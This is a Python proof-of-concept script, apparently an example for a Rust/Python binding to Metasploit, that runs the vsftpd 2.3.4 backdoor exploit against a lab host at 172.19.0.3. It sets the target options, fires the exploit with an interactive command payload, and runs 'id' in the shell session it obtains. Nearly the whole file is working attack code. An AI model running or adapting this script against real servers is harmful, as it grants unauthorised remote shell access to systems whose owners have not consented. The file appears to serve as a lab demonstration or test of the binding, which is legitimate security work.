"""vsftpd 2.3.4 backdoor exploit POC using Pyo3 -> Magnus -> MSF.

Target: assassinate-target (172.19.0.3)
Exploit: exploit/unix/ftp/vsftpd_234_backdoor
Payload: cmd/unix/interact (triggers backdoor on FTP login with smiley face)

Usage (from host):
    export MSF_ROOT=/home/astark/Projects/metasploit-framework
    .venv/bin/python python/examples/vsftpd_poc.py
"""

from __future__ import annotations

import os
import time

import assassinate_pyo3

TARGET_HOST = "172.19.0.3"
TARGET_PORT = "21"
EXPLOIT = "exploit/unix/ftp/vsftpd_234_backdoor"
PAYLOAD = "cmd/unix/interact"


def main() -> int:
    msf_root = os.environ.get("MSF_ROOT", "/opt/metasploit-framework")
    print(
        f"[+] vsftpd 2.3.4 backdoor POC against {TARGET_HOST}:{TARGET_PORT} (MSF: {msf_root})"
    )
    print(
        f"[+] vsftpd backdoor triggers on FTP login with username ending in :)"
    )

    try:
        print("[+] Initializing MSF...")
        assassinate_pyo3.init_msf(msf_root)
        print("[+] MSF initialized")

        version = assassinate_pyo3.framework_version()
        print(f"[+] MSF Version: {version}")

        print(f"\n[+] Getting info on {EXPLOIT}...")
        info = assassinate_pyo3.get_module_info(EXPLOIT)
        print(f"    Description: {info.get('description', 'N/A')[:80]}...")
        print(f"    Module Type: {info.get('module_type', 'N/A')}")

        print(f"\n[+] Creating module instance for {EXPLOIT}...")
        module = assassinate_pyo3.create_module(EXPLOIT)
        print(f"[+] Module created: {module.fullname()}")

        print("\n[+] Setting module options...")
        module.set_option("RHOSTS", TARGET_HOST)
        module.set_option("RPORT", TARGET_PORT)
        print(f"[+] Set RHOSTS={TARGET_HOST}, RPORT={TARGET_PORT}")

        print(f"\n[+] Running vsftpd backdoor exploit {EXPLOIT}...")
        print("[+] The backdoor triggers on FTP connection...")

        start_time = time.time()
        # vsftpd is fast but async
        session = module.exploit_expect_session(PAYLOAD, 20)
        elapsed = time.time() - start_time

        print(f"[+] Exploit completed in {elapsed:.1f}s")

        if session is not None:
            print(f"[+] SUCCESS! Got session ID: {session.sid()}")
            print("[+] Running 'id':")
            try:
                output = session.run_cmd("id")
                print(f"{output.strip()}")
            except Exception as e:
                print(f"[-] Failed to run command: {e}")
        else:
            print("[-] Exploit completed but no session was created")
            print("    The vsftpd backdoor only fires ONCE per connection")
            print("    and requires the username to end with :)")

    except assassinate_pyo3.AssassinateError as exc:
        print(f"\n[-] Error: {exc}")
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
